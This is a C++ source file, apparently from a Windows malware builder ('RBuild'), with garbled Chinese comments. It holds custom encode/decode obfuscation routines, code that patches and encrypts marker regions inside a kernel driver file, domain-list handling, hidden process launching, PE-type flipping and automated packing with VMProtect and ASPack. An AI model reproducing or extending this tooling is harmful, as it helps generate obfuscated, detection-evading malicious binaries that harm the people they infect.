////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "stdafx.h"
#include "RBuild.h"
#include "RBuildDlg.h"

#include <Imagehlp.h>
#include <Psapi.h>
#include <shlwapi.h>

//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//

//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//

//--------------------------------------------------------------------------//

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//������д��һ���½��ļ�
BOOL WriteDataToFile(TCHAR *pszFilePath, void *pData, DWORD dwDateSize)
{
	HANDLE	hFile = INVALID_HANDLE_VALUE;
	DWORD	dwByte = 0;


	hFile = CreateFile(pszFilePath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	WriteFile(hFile, pData, dwDateSize, &dwByte, NULL);
	CloseHandle( hFile );

	return TRUE;
}


//�ͷ���Դ���ļ�
BOOL Reresource(HMODULE hModule, TCHAR *szReType, int iResourceID, TCHAR *szFilePath)
{
	HRSRC	hResource = NULL;
	HGLOBAL	pLoad = NULL;
	LPVOID	pLock = NULL;
	

	hResource = FindResource(hModule, MAKEINTRESOURCE( iResourceID ), szReType);
	pLoad = LoadResource(hModule, hResource);
	pLock = LockResource( pLoad );

	WriteDataToFile(szFilePath, pLock, SizeofResource(hModule, hResource));

	FreeResource( pLoad );

	return TRUE;
}

//������� 155�ֽ�����
BOOL Decode(char *pInput, DWORD	dwInputSize, DWORD dwRendomVal)
{
	DWORD	*pDword = NULL, *pLast = NULL, dwAlign = 0;


	//�Ƿ� 4�ֽ� ����?
	dwAlign = dwInputSize % sizeof(DWORD);
	if(dwAlign != 0)
	{
		return FALSE;
	}
	pLast = ( (DWORD*)(pInput + dwInputSize) ) - 1;
	pDword = (DWORD*)pInput;
	while(true)
	{
		DWORD	dwCurrentVal = 0, dwMoveBit = 0, dwRO = 0;


		dwMoveBit = ( (DWORD)pDword - (DWORD)pInput ) & 0x0000001F; //ʣ�µ� 5λ
		dwRO = dwMoveBit & 0x04;
		dwCurrentVal = *pDword;
		if(dwRO < 1)	//ѭ������
		{
			__asm
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROL		dword ptr [dwCurrentVal], cl;
				pop		ecx;
			}
		}
		else			//ѭ������
		{
			__asm
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROR		dword ptr [dwCurrentVal], cl;
				pop		ecx;
			}
		}
		*pDword = (~(dwCurrentVal ^ dwRendomVal) ) + dwRendomVal + *(pDword + 1);
		
		pDword ++;
		if( pDword >= pLast)	//��������һ��ֵ
		{
			DWORD	dwLastVal = 0;

			dwLastVal = *pDword + dwRendomVal;
			dwMoveBit = ( (DWORD)pDword - (DWORD)pInput ) & 0x0000001F; //ʣ�µ� 5λ
			__asm	//ѭ������
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROL		dword ptr [dwLastVal], cl;
				pop		ecx;
			}
			*pDword = (~dwLastVal) ^ dwRendomVal;
			break;
		}
	}

	return TRUE;
}

//����һ������; //--> ע��,dwInputSize һ��Ҫ�� 4 �ֽڶ���
BOOL Encode(char *pInput, DWORD	dwInputSize, DWORD dwRendomVal, DWORD dwFlag)
{
	DWORD	*pDword = NULL, dwAlign= 0, dwLastVal = 0, dwMoveBit = 0, dwRO = 0;


	//�Ƿ� 4�ֽ� ����?
	dwAlign = dwInputSize % sizeof(DWORD);
	if(dwAlign != 0)
	{
		MessageBox(NULL, L"Encode��������!", L"Error", MB_ICONERROR);
		return	FALSE;
	}

	//�ƶ������һ��DWORD
	pDword = ( (DWORD*)(pInput + dwInputSize) ) - 1;

	//���һ��ֵ
	dwLastVal = ~( *pDword ^ dwRendomVal );
	dwMoveBit = ( (DWORD)pDword - (DWORD)pInput ) & 0x0000001F; //ʣ�µ� 5λ
	__asm	//ѭ������
	{
		push	ecx;
		mov		ecx, dwMoveBit;
		ROR		dword ptr [dwLastVal], cl;
		pop		ecx;
	}
	dwLastVal = dwLastVal - dwRendomVal;
	*pDword = dwLastVal;
			
	//�� 4�ֽ� �������
	pDword -- ;
	while((DWORD)pDword >= (DWORD)pInput)
	{
		DWORD	dwCurrentVal = 0, dwNextVal = 0;


		dwMoveBit = ( (DWORD)pDword - (DWORD)pInput ) & 0x0000001F; //ʣ�µ� 5λ
		dwRO = dwMoveBit & 0x04;

		dwCurrentVal = ~( *(pDword) - *(pDword + 1) - dwRendomVal ) ^ dwRendomVal;
		//����ǰƫ����λ

		if(dwRO > 1)	//ѭ������
		{
			__asm
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROL		dword ptr [dwCurrentVal], cl;
				pop		ecx;
			}
		}
		else			//ѭ������
		{
			__asm
			{
				push	ecx;
				mov		ecx, dwMoveBit;
				ROR		dword ptr [dwCurrentVal], cl;
				pop		ecx;
			}
		}

		*pDword = dwCurrentVal;

		pDword --;
	}
	
	return TRUE;
}

//ɾ���ַ����е� | ,��ͳ���ж��ٸ�
DWORD DelSeparator(char *pString, DWORD dwSize)
{
	DWORD	dwCount = 0;
	char	*pMove = NULL;


	pMove = pString;
	for(DWORD i = 0; i < dwSize; i++)
	{
		if(*pMove == '\x00')
			break;
		if(*pMove == '|')
		{
			*pMove = '\x00';
			dwCount ++;
		}

		pMove ++;
	}

	return dwCount;
}

//���ݵ�ǰϵͳʱ��Ϊ����,����һ�������
DWORD GetRandomVal(DWORD dwRand)
{
	DWORD		dwResult = 0;
	FILETIME	FileTime;


	if(dwRand == 0)
		GetSystemTimeAsFileTime( &FileTime );
	else
		FileTime.dwLowDateTime = dwRand;

	srand( FileTime.dwLowDateTime & 0xFFFF );
	dwResult = (DWORD)rand() << 16;
		
	srand( FileTime.dwLowDateTime & 0xFFFF0000 );
	dwResult = dwResult | (DWORD)rand();

	return	dwResult;
}

//�� ! ת��Ϊ -
void ConverSymbol(char *pSrcData, DWORD dwDataSize)
{
	char	*pMove = NULL;


	for(DWORD i = 0; i < dwDataSize; i++)
	{
		if(pSrcData[i] == '\x00')
		{
			break;
		}

		if(pSrcData[i] == '!')
		{
			pSrcData[i] = '-';
		}
	}

	return;
}

//���ַ�������ʽ���ص�ǰʱ��
TCHAR *FormatTimeToChar(TCHAR *szBuf, DWORD dwSize)
{
	SYSTEMTIME	time;


	memset(&time, 0, sizeof(time));
	GetLocalTime( &time );

	memset(szBuf, 0, sizeof(dwSize));
	wsprintf(szBuf, L"%d-%.2d-%.2d_%.2d-%.2d-%.2d", time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);

	return	szBuf;
}

//���ܷ���˰汾��
unsigned char* EnCodeVersion(unsigned char cVersionInfo[16], DWORD dwSrcVersion)
{
	DWORD	dwVersion = 0, dwRand = 0;


	dwVersion = dwSrcVersion;
	memset(cVersionInfo, 0, 16);

	//ѭ������9λ
	__asm
	{
		mov		ecx, 0x09;
		ROL		dword ptr [dwVersion], cl;
	}

	//����4�����DWORD
	*(DWORD*)&cVersionInfo[0] = GetRandomVal( 0 );
	*(DWORD*)&cVersionInfo[4] = GetRandomVal( *(DWORD*)&cVersionInfo[0] );
	*(DWORD*)&cVersionInfo[8] = GetRandomVal( *(DWORD*)&cVersionInfo[4] );
	*(DWORD*)&cVersionInfo[12] = GetRandomVal( *(DWORD*)&cVersionInfo[8] );

	cVersionInfo[3] = 0;
	cVersionInfo[6] = 0;
	cVersionInfo[9] = 0;
	cVersionInfo[12] = 0;

	*(DWORD*)&cVersionInfo[0] |= (dwVersion & 0xFF000000);
	*(DWORD*)&cVersionInfo[4] |= (dwVersion & 0x00FF0000);
	*(DWORD*)&cVersionInfo[8] |= (dwVersion & 0x0000FF00);
	*(DWORD*)&cVersionInfo[12] |= (dwVersion & 0x000000FF);

	if(cVersionInfo[5] == 0 && cVersionInfo[10] == 0)
	{
		for(int i = 0; i < 16; i++)
		{
			if(cVersionInfo[i] != 0)
			{
				cVersionInfo[5] = cVersionInfo[i];
				break;
			}
		}
	}

	cVersionInfo[2] = cVersionInfo[5] ^ cVersionInfo[10];	//��֤

	return cVersionInfo;
}

//�ҵ����ò������ƫ��
DWORD FoundParamOffset(char *pInBuffer, DWORD dwBufferSize, DWORD dwVal_1, DWORD dwVal_2, DWORD dwVal_3, DWORD dwVal_4)
{
	char	*pMove = NULL;

	pMove = pInBuffer;
	while( ( (pInBuffer + dwBufferSize - 1 - (sizeof(DWORD) * 4)) - pMove) > 0)
	{
		if(			 *(DWORD*)pMove == dwVal_1
			&& *((DWORD*)pMove + 1) == dwVal_2
			&& *((DWORD*)pMove + 2) == dwVal_3
			&& *((DWORD*)pMove + 3) == dwVal_4
			)
		{
			return (DWORD)(pMove - pInBuffer);
		}

		pMove ++;
	}

	return 0;
}

//���������ϼ�������ID, �� 17.baidu.com
void AddIdToDN(char *pSrcData, DWORD dwSize, DWORD dwSelfID)
{
	char	cTemp[4096], *pMove = NULL, *pDest = NULL;


	memset(cTemp, 0, sizeof(cTemp));

	pDest = cTemp;
	pMove = pSrcData;

	while(*pMove)
	{
		wsprintfA(pDest, "www.%s", pMove);

		pMove = pMove + lstrlenA( pMove ) + 1;
		pDest = pDest + lstrlenA( pDest ) + 1;
	}

	memcpy(pSrcData, cTemp, dwSize);

	return;
}

//Hase
DWORD Hase(char *pInput)
{
	char	*pTemp = NULL;
	DWORD	dwGest = 0;

	pTemp = pInput;
	while(*pTemp)
	{
		dwGest = ( (dwGest << 25) | (dwGest >> 7) );
		dwGest = dwGest + (DWORD)(*pTemp);
		pTemp++;
	}

	return dwGest;
}

//��ȡ��Դ��һ���ڴ���, ������ڴ��ɵ������ͷ�
BOOL CopyResourceInMem(HMODULE hModule, TCHAR *szReType, int iResourceID, char **pByte, DWORD *pdwSize)
{
	HRSRC	hRsc = NULL;
	HGLOBAL	hLoad = NULL;
	DWORD	dwSize = 0;
	char	*pReByte = NULL;


	hRsc = FindResource(hModule, MAKEINTRESOURCE( iResourceID ), szReType);
	hLoad = LoadResource(hModule, hRsc);
	dwSize = SizeofResource(hModule, hRsc);


	pReByte = (char*)VirtualAlloc(NULL, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	memcpy(pReByte, (char*)LockResource( hLoad ), dwSize);

	*pByte = pReByte;
	*pdwSize = dwSize;


	FreeResource( hLoad );

	return TRUE;
}

//ִ������, ��Ҫ�ȴ��ӽ���ִ�����, ���Բ�����WinExec
BOOL ExcuteCommand(TCHAR *szCommand, DWORD dwWaitTime, DWORD *pdwExitCode, DWORD *pdwProId)
{
	BOOL				bResult = FALSE;
	PROCESS_INFORMATION	pi;
	STARTUPINFO			si;


	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	bResult = CreateProcess(NULL, szCommand, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE|CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if(bResult == TRUE)
	{
		CloseHandle( pi.hThread );
		if(dwWaitTime > 0)
		{
			WaitForSingleObject(pi.hProcess, dwWaitTime);
		}
		if(pdwProId != NULL)
		{
			*pdwProId = pi.dwProcessId;
		}
		if(pdwExitCode != NULL)
		{
			GetExitCodeProcess(pi.hProcess, pdwExitCode);
		}
		CloseHandle( pi.hProcess );
	}

	return bResult;
}

//���ļ����ڴ�, ������ڴ��ɵ������ͷ�
BOOL ReadFileInMem(TCHAR *pFilePath, char **pFileByteParam, DWORD *dwFileSizeParam)
{
	BOOL				bStatus = FALSE;
	char				*pFileByte = NULL;
	HANDLE				hFile = INVALID_HANDLE_VALUE;
	DWORD				dwFileSize = 0, dwByte = 0, dwTotalRead = 0, dwCurrentRead = 0;


	if(PathFileExists( pFilePath ) == FALSE)
	{
		goto __END;
	}

	for(int i = 0; i < 50; i++)
	{
		hFile = CreateFile(pFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hFile != INVALID_HANDLE_VALUE)
		{
			break;
		}
		Sleep( 100 );
	}

	dwFileSize = GetFileSize(hFile, NULL);
	if(dwFileSize == 0 || dwFileSize == INVALID_FILE_SIZE)
	{
		goto __END;
	}

	pFileByte = (char*)VirtualAlloc(NULL, dwFileSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if(pFileByte == NULL)
	{
		goto __END;
	}

	dwCurrentRead = dwFileSize;
	while(dwTotalRead < dwFileSize)
	{
		if( ReadFile(hFile, pFileByte, dwCurrentRead, &dwByte, NULL) == FALSE )
		{
			goto __END;
		}

		dwTotalRead = dwTotalRead + dwByte;
		dwCurrentRead = dwFileSize - dwTotalRead;
	}

	bStatus = TRUE;

__END:
	if(hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle( hFile );
	}

	if(bStatus == FALSE)
	{
		if(pFileByte != NULL)
		{
			VirtualFree(pFileByte, 0, MEM_RELEASE);
		}
		
		*pFileByteParam = NULL;
		*dwFileSizeParam = 0;
	}
	else
	{
		*pFileByteParam = pFileByte;
		*dwFileSizeParam = dwFileSize;
	}

	return bStatus;
}

//���� sys �ļ�
char *ProcessSys(char *pSrcData, DWORD dwSize, char *pRandData)
{
	char				*pStart = NULL, *pMove = NULL, *pRandVal = NULL;
	DWORD				dwRandVal = 0, dwSrcCheckSum = 0, dwNewCheckSum = 0;
	IMAGE_NT_HEADERS	*pNtHead = NULL;



	//һ���µ� sys
	pStart = (char*)VirtualAlloc(NULL, dwSize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	memcpy(pStart, pSrcData, dwSize);

	pRandVal = pRandData;

	//��������������, �������
	pMove = pStart;
	while( pMove < (pStart + dwSize) )
	{
		if(*pMove == 0x11)
		{
			if(*(DWORD*)pMove == 0x44332211 && *((DWORD*)pMove + 1) == 0x88776655)
			{
				char	*pTemp = NULL;
				DWORD	dwLen = 0;


				//���㳤��
				pTemp = pMove;
				while(true)
				{
					if(*(DWORD*)pTemp == 0xB8B8B8B8)
					{
						dwLen = (pTemp - pMove) + 8;
						break;
					}

					pTemp ++;
				}

				//����(����)�������
				Encode(pMove, dwLen, (DWORD)*pRandVal, 0);

				//��һ�������
				pRandVal ++;
			}
		}

		pMove ++;
	}

	//���¼���У���
	pNtHead = CheckSumMappedFile(pStart, dwSize, &dwSrcCheckSum, &dwNewCheckSum);
	pNtHead->OptionalHeader.CheckSum = dwNewCheckSum;

	//����������(�ļ�)����
	dwRandVal = GetRandomVal( 0 );
	Encode(pStart + sizeof(DWORD), dwSize - sizeof(DWORD) , dwRandVal, 0);
	*(DWORD*)pStart = dwRandVal;

	return pStart;
}

void VMProtect(wchar_t *wFilePath)
{
	TCHAR				szCurrentPath[MAX_PATH], szCommand[1024], szVMPPath[MAX_PATH], szMapFile[MAX_PATH], szProjectFile[MAX_PATH],
						szOutFilePath[MAX_PATH];
	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;
	

	//��ǰĿ¼
	memset(szCurrentPath, 0, sizeof(szCurrentPath));
	GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
	*(DWORD*)(wcsrchr(szCurrentPath, L'\\')) = 0x00000000;

	//VMProtect_Con.exe
	memset(szVMPPath, 0, sizeof(szVMPPath));
	wsprintf(szVMPPath, L"%s\\%s", szCurrentPath, L"VMProtect_Con.exe");
	if(PathFileExists( szVMPPath ) == FALSE)
	{
		Reresource(NULL, L"FILE", FILE_VMPCON, szVMPPath);
	}

	//"��ʱ"�����ļ�
	memcpy(szMapFile, wFilePath, sizeof(szMapFile));
	lstrcpy(wcsrchr(szMapFile, L'.') + 1, L"map");
	if(PathFileExists( szMapFile ) == FALSE)
	{
		Reresource(NULL, L"FILE", FILE_MAP, szMapFile);
	}

	//�����ļ�
	memset(szProjectFile, 0, sizeof(szProjectFile));
	wsprintf(szProjectFile, L"%s\\%s", szCurrentPath, L"Project.vmp");
	if(PathFileExists( szProjectFile ) == FALSE)
	{
		Reresource(NULL, L"FILE", FILE_PROJECT, szProjectFile);
	}

	//����ļ�
	memcpy(szOutFilePath, wFilePath, sizeof(szOutFilePath));
	lstrcpy(wcsrchr(szOutFilePath, L'.'), L"-VMP.exe");

	//���� VMProtect_Con.exe ���м���
	wsprintf(szCommand, L"\"%s\" \"%s\" \"%s\" -pf \"%s\" -we", szVMPPath, wFilePath, szOutFilePath, szProjectFile);

	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	CreateProcess(NULL, szCommand, NULL, NULL, TRUE, CREATE_DEFAULT_ERROR_MODE|CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	CloseHandle( pi.hThread );
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle( pi.hProcess );

	//ɾ�����ͷŵ��ļ�
	DeleteFile( szVMPPath );
	DeleteFile( szProjectFile );
	DeleteFile( szMapFile );

	//����Դ�ļ�
	MoveFileEx(szOutFilePath, wFilePath, MOVEFILE_REPLACE_EXISTING);

	return;
}

//��һ���ļ���Ϊ dll ���� exe
BOOL ChangType(TCHAR *szFilePath, DWORD dwType)
{
	BOOL	bStatus = FALSE;
	HANDLE	hFile = INVALID_HANDLE_VALUE, hMap = NULL;
	char	*pFileByte = NULL;


	hFile = CreateFile(szFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING/*Take care*/, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		goto __END;
	}

	hMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);		//��дȨ��
	pFileByte = (char*)MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);	//Ӱ�������ļ�
	if(pFileByte == NULL)
	{
		goto __END;
	}

	//����PEͷ�е��ļ�����
	IMAGE_NT_HEADERS	*PE = NULL;

	PE = (IMAGE_NT_HEADERS*)(pFileByte + *((DWORD*)(pFileByte + 0x3C)));
	if(dwType == 1)
	{
		PE->FileHeader.Characteristics |= 0x2000;	//��Ϊ DLL
	}
	else if(dwType == 2)
	{
		PE->FileHeader.Characteristics &= 0xDFFF;	//��Ϊ EXE
	}


__END:
	if(pFileByte != NULL)
		UnmapViewOfFile( pFileByte );
	if(hMap != NULL)
		CloseHandle( hMap );
	if(hFile != INVALID_HANDLE_VALUE)
		CloseHandle( hFile );

	return bStatus;
}

void ASPack(wchar_t *wFilePath)
{
	TCHAR	szCurrentPath[MAX_PATH], szPack[MAX_PATH], szIniPath[MAX_PATH], szSelfCommand[1024];


	//��ǰĿ¼
	memset(szCurrentPath, 0, sizeof(szCurrentPath));
	GetModuleFileName(NULL, szCurrentPath, MAX_PATH);
	*(DWORD*)(wcsrchr(szCurrentPath, L'\\')) = 0x00000000;

	//�ͷ���ص��ļ�
	memset(szPack, 0, sizeof(szPack));
	wsprintf(szPack, L"%s\\%s", szCurrentPath, L"ASPack2.24.dll");
	Reresource(NULL, L"FILE", FILE_ASPack, szPack);

	memset(szIniPath, 0, sizeof(szIniPath));
	wsprintf(szIniPath, L"%s\\%s", szCurrentPath, L"English.ini");
	Reresource(NULL, L"FILE", FILE_ASPackini, szIniPath);

	//���� ASPack ���мӿ�
	memset(szSelfCommand, 0, sizeof(szSelfCommand));
	wsprintf(szSelfCommand, L"\"%s\" \"%s\" /R+ /B- /D+ /E-", szPack, wFilePath);
	ExcuteCommand(szSelfCommand, 0, NULL, NULL);

	//ASPack Ҫ�ֶ��ر�
	for(DWORD i = 0; i < 100; i++)
	{
		if(DeleteFile( szPack ) == TRUE)
		{
			DeleteFile( szIniPath );
			break;
		}

		Sleep( 50 );
	}

	return;
}